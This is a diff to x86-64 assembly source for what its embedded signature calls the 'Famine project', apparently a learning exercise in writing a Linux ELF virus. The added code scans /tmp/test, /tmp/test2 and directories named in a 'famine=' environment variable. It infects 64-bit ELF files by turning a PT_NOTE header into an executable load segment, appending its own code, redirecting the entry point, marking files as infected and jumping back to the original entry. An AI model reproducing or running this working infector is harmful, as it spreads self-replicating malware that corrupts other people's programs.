@@ -1,10 +1,12 @@
-%define SYS_READ    0
 %define SYS_WRITE   1
 %define SYS_OPEN	2
 %define SYS_CLOSE   3
 %define SYS_CHDIR   80
 %define SYS_EXIT    60
 %define NULL        0
+
+%define SUCCESS    0
+%define ERROR      -1
 
 %define BARRA_N     10
 
@@ -16,30 +18,43 @@ _start:
     syscall
 
     test rax, rax
-    jnz exit_success
+    jnz safe_exit
 
+    ; call redirect_dev_null
+
+    mov r12, rsp
+    add r12, 8
+    
     push rdx
     push rbp           ; save the base pointer
     mov rbp, rsp       ; set the base pointer to the current stack pointer
-    sub rsp, 5000      ; reserving 5000 bytes
+    sub rsp, 15000      ; reserving 5000 bytes
     mov r15, rsp       ; r15 = malloc(5000)
 
     lea rdi, [rel folder1] ; rdi = "/tmp/test"
-    call chdir ; change directory to "/tmp/test"
-    call open_dir ; change directory to "/tmp/test"
-    call getdents
-    xor rcx, rcx ; rcx = 0
-    call iterate_loop ; iterate over directory entries
-
-    ; this is supposed to work properly
+    call infect_dir
+    
     lea rdi, [rel folder2] ; rdi = "/tmp/test2"
-    call chdir ; change directory to "/tmp/test2"
-    call open_dir ; change directory to "/tmp/test2"
-    call getdents
-    xor rcx, rcx ; rcx = 0
-    call iterate_loop ; iterate over directory entries
+    call infect_dir
+
+    call do_env
 
     call restore_stack ; exit
+
+infect_dir:
+    call chdir ; change directory to "/tmp/test2"
+    test rax, rax ; check for error
+    js .failed ; if error, exit
+    call open_dir ; change directory to "/tmp/test2"
+    test rax, rax ; check for error
+    js .failed ; if error, exit
+    call getdents
+    test rax, rax ; check for error
+    js .failed ; if error, exit
+    xor rcx, rcx ; rcx = 0
+    call iterate_loop ; iterate over directory entries
+.failed:
+    ret
 
 open_dir:
     mov rax, SYS_OPEN ; syscall number for sys_open
@@ -52,15 +67,13 @@ open_dir:
 chdir:
     mov rax, SYS_CHDIR ; syscall number for sys_chdir
     syscall ; invoke operating system to change directory
-    test rax, rax ; check for error
-    js safe_exit ; if error, exit
     ret
 
 getdents:
     mov rdi, rax ; save file descriptor
     mov rax, 217 ; syscall number for sys_getdents64
     lea rsi, [r15 + 400] ; buffer to store directory entries
-    mov rdx, 1024 ; size of buffer
+    mov rdx, 8192 ; size of buffer
     syscall ; invoke operating system to read directory entries
     test rax, rax ; check for error
     js safe_exit ; if error, exit
@@ -70,66 +83,85 @@ getdents:
     syscall ; invoke operating system to close directory
 
     ret
-
 iterate_loop:
-
     push rcx
     cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
     jne .go_to_next
-    
 
     lea rdi, [rcx + r15 + 419] ; filename
     mov rsi, 2 ; O_RDWR
     mov rdx, 0 ; mode
     mov rax, SYS_OPEN ; syscall number for sys_open
     syscall ; invoke operating system to open file
-    ; call open_file ; open file
+
     mov r9, rax ; save file descriptor
     cmp rax, 0 ; check for error
     jbe .go_to_next ; if error, go to next entry
 
-
-    ; read ehdr
-
     call pread ; read ELF header
-    ; test rax, rax ; check for error
-    ; jz .go_to_next ; if error, go to next entry
-
-
-    ; mov rsi, r15 ; save ELF header address
-    ; add rsi, 144 ; point to ELF header
-    ; mov rdx, 16
-    ; call print_bytes
+    test rax, rax ; check for error
+    jz .close_file ; if error, go to next entry
 
     ; check if it's an ELF file
     cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
     jnz .close_file ; if not, go to next entry
 
-
     cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
     jne .close_file ; if not, go to next entry
 
-    ;check if it's already infected, if i'm appending to EOF the signature i can check there.
+    cmp dword [r15 + 152], 0x004F4546
+    je .close_file
 
     mov r8, [r15 + 176]
     mov rbx, 0
     mov r14, 0
 
-    call find_phdr ; find PT_NOTE segment
-    cmp rax, 2 ; check if it's a PT_NOTE segment
-    jne .close_file ; if not, go to next entry
+    call find_phdr
+    cmp rax, 2
+    jne .close_file
 
-    call hello_world  ; print "Hello, World!"
+    call get_target_phdr_file_offset
+    call file_info
 
-    ; infect
-        ; for infection i must append virus to the file, then i must
-        ; modify the entry point to point to the virus
-        ; then i must modify the virus to jump to the original entry point
+    mov rdi, r9
+    mov rsi, 0
+    mov rdx, 2
+    mov rax, 8
+    syscall
+    push rax
 
-    ; close file
+    call .delta
+    .delta:
+        pop r11
+        sub r11, .delta
+
+    mov rdi, r9
+    lea rsi, [r11 + _start]
+    mov rdx, safe_exit - _start
+    mov r10, rax
+    mov rax, 18
+    syscall
+
+    cmp rax, 0
+    jbe .close_file
+
+    pop rax
+    mov r11, rax
+    
+    call patch_phdr
+    test rax, rax
+    js .close_file
+
+    call patch_ehdr
+    test rax, rax
+    js .close_file
+
+    call write_patched_jmp
+    test rax, rax
+    js .close_file
 
     .close_file:
-        mov rax, SYS_CLOSE ; syscall number for sys_close
+        mov rax, SYS_CLOSE
         mov rdi, r9 ; file descriptor
         syscall ; invoke operating system to close file
 
@@ -138,8 +170,6 @@ iterate_loop:
         add cx, word [rcx + r15 + 416]
         cmp rcx, qword [r15 + 350]
         jne iterate_loop
-
-    call new_line
 ret
 
 open_file:
@@ -183,66 +213,207 @@ find_phdr:
         add r8w, word [r15 + 198] ; add size of program header to offset
         jnz find_phdr ; read next program header
 
-print_bytes:
-    ; rsi points to the bytes to print
-    ; rdx is the number of bytes to print
-    mov rax, SYS_WRITE
-    mov rdi, 1 ; stdout
+
+get_target_phdr_file_offset:
+    mov ax, bx
+    mov dx, word [r15 + 198]
+    imul dx
+    mov r14w, ax
+    add r14, [r15 + 176]
+    mov rax, SUCCESS ; Indicate success
+    ret
+
+file_info:
+    mov rdi, r9
+    mov rsi, r15
+    mov rax, 5
     syscall
+    test rax, rax
+    js .error
+    mov rax, SUCCESS
+    ret
+.error:
+    mov rax, ERROR
     ret
 
+patch_phdr:
+    mov dword [r15 + 208], 1
+    mov dword [r15 + 212], 2 | 4 | 1
+    mov [r15 + 216], r11
+    mov r13, [r15 + 48]
+    add r13, 0xc000000
+    mov [r15 + 224], r13
+    mov qword [r15 + 256], 0x200000
+    add qword [r15 + 240], safe_exit - _start + 5
+    add qword [r15 + 248], safe_exit - _start + 5
 
-print_string:
-    ; Print string pointed to by rdi
-    mov rax, SYS_WRITE ; syscall number for sys_write
-    mov rdi, 1 ; file descriptor (stdout)
-    mov rdx, 256 ; max length
+    mov rdi, r9
+    mov rsi, r15
+    lea rsi, [r15 + 208]
+    mov dx, word [r15 + 198]
+    mov r10, r14
+    mov rax, 18
     syscall
+    cmp rax, 0
+    jbe .error
+    mov rax, SUCCESS
+    ret
+.error:
+    mov rax, ERROR
     ret
 
-
-;debug
-hello_world:
-; PRINT
-    mov rax, 1 ; syscall number for sys_write
-    mov rdi, 1 ; file descriptor 1 is stdout
-    lea rsi, [rel hello] ; address of string to output
-    mov rdx, 14 ; number of bytes
-    syscall ; invoke operating system to do the write
+patch_ehdr:
+    mov r14, [r15 + 168]
+    mov [r15 + 168], r13
+    mov r13, 0x004F4546
+    mov [r15 + 152], r13
+    mov rdi, r9
+    lea rsi, [r15 + 144]
+    mov rdx, 64
+    mov r10, 0
+    mov rax, 18
+    syscall
+    cmp rax, 0
+    jbe .error
+    mov rax, SUCCESS
     ret
-; PRINT
-;debug
-
-new_line:
-    mov rax, 1 ; syscall number for sys_write
-    mov rdi, 1 ; file descriptor 1 is stdout
-    lea rsi, [rel newline] ; address of string to output
-    mov rdx, 1 ; number of bytes
-    syscall ; invoke operating system to do the write
+.error:
+    mov rax, ERROR
     ret
 
+write_patched_jmp:
+    mov rdi, r9
+    mov rsi, 0
+    mov rdx, 2
+    mov rax, 8
+    syscall
 
-safe_exit:
-    mov rax, SYS_EXIT ; syscall number for sys_exit
-    xor rdi, rdi ; exit code 0
-    syscall ; invoke operating system to exit
+    mov rdx, [r15 + 224]
+    add rdx, 5
+    sub r14, rdx
+    sub r14, safe_exit - _start
+    mov byte [r15 + 300], 0xe9
+    mov dword [r15 + 301], r14d
 
+    mov rdi, r9
+    lea rsi, [r15 + 300]
+    mov rdx, 5
+    mov r10, rax
+    mov rax, 18
+    syscall
+    cmp rax, 0
+    jbe .error
+
+    mov rax, 162
+    syscall
+    mov rax, SUCCESS
+    ret
+.error:
+    mov rax, ERROR
+    ret
+
+do_env:
+.skip_argv:
+    ; mov rax, [rbx]
+    mov rax, [r12]
+    test rax, rax
+    je .after_argv
+    add r12, 8
+    jmp .skip_argv
+
+.after_argv:
+    add r12, 8
+
+.find_famine:
+    mov rsi, [r12]
+    test rsi, rsi
+    je .exit
+    
+    lea rdi, [rel famine_str]
+    call ft_strncmp
+    test rax, rax
+    je .print_famine_value
+
+    add r12, 8
+    jmp .find_famine
+
+.print_famine_value:
+    call split_and_print
+    jmp .exit
+
+.exit:
+    ret
+
+ft_strncmp:
+    mov rcx, 7
+    repe cmpsb
+    mov rax, rcx
+    ret
+
+split_and_print:
+    mov rdi, rsi
+    mov rsi, rdi
+.split_loop:
+    mov al, [rsi]
+    test al, al
+    je .done
+    cmp al, ','
+    je .print_word
+    inc rsi
+    jmp .split_loop
+
+.print_word:
+    mov byte [rsi], 0
+    mov r12, rsi
+    call infect_dir
+.debug:    
+    mov rsi, r12 
+    inc rsi
+    mov rdi, rsi
+    jmp .split_loop
+
+.done:
+    call infect_dir
+    ret
 
 folder1 db "/tmp/test", NULL
 folder2 db "/tmp/test2", NULL
 
-hello db 'Hello, World!', BARRA_N, NULL
-newline db  BARRA_N, NULL
+famine_str db 'famine=', 0
+
+dev_null db "/dev/null", NULL
 
 signature db "Famine project coded by gemartin", NULL
 
+redirect_dev_null:
+    lea rdi, [rel dev_null]
+    mov rsi, 0
+    mov rax, 2
+    syscall
+    mov rdi, rax
+
+    mov rsi, 0
+    mov rax, 33
+    syscall
+
+    mov rsi, 1
+    mov rax, 33
+    syscall
+
+    mov rsi, 2
+    mov rax, 33
+    syscall
+
+    mov rax, 3
+    syscall
+    ret
 
 restore_stack:
-    mov rsp, rbp       ; restore the stack pointer
-    pop rbp            ; restore the base pointer
-    pop rdx            ; restore rdx
+    mov rsp, rbp
+    pop rbp
+    pop rdx
 
-exit_success:
+safe_exit:
     xor rdi, rdi
     mov rax, SYS_EXIT
     syscall
